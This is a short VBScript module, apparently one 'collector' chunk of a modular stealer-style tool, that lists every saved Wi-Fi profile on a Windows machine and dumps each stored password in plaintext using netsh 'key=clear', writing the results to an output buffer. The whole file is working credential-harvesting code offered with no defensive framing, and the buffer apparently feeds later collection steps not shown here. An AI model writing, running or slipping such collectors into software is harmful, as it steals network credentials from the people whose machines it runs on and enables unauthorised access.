' chunk: collectors/wifi_passwords
' depends: core/emit_buffer, core/run_cmd
' provides: collect_wifi_passwords
' format: vbscript

Sub collect_wifi_passwords()
    emit vbCrLf & "=== WIFI PROFILES ===" & vbCrLf
    Dim profiles, lines, i, pos, profileName
    profiles = _run("netsh wlan show profiles")
    emit profiles
    lines = Split(profiles, vbCrLf)
    For i = 0 To UBound(lines)
        pos = InStr(lines(i), "All User Profile")
        If pos > 0 Then
            pos = InStr(lines(i), ":")
            If pos > 0 Then
                profileName = Trim(Mid(lines(i), pos + 1))
                If Len(profileName) > 0 Then
                    emit "--- Key for: " & profileName & " ---" & vbCrLf
                    emit _run("netsh wlan show profile """ & profileName & """ key=clear")
                End If
            End If
        End If
    Next
End Sub
